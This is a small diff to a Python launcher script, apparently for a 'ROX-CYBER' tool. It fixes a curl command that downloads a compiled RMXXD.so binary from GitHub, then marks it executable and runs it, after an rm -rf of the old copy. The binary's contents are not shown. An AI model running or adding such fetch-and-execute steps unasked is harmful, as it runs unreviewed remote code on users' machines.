@@ -12,8 +12,8 @@ except:
     pass
 os.system('rm -rf RMXXD.so')
 os.system('git pull')
-url = "https://github.com/ROX-CYBER/executables/blob/main/RMXXD.cpython-311.so?raw=true -o RMXXD.so"
+#url = "https://github.com/ROX-CYBER/executables/blob/main/RMXXD.cpython-311.so?raw=true -o RMXXD.so"
 os.system('mkdir .RMX')
-os.system('curl -L {url} > RMXXD.so')
+os.system('curl -L https://github.com/ROX-CYBER/executables/blob/main/RMXXD.cpython-311.so?raw=true -o RMXXD.so') 
 os.system('chmod +x RMXXD.so')
 os.system('./RMXXD.so')
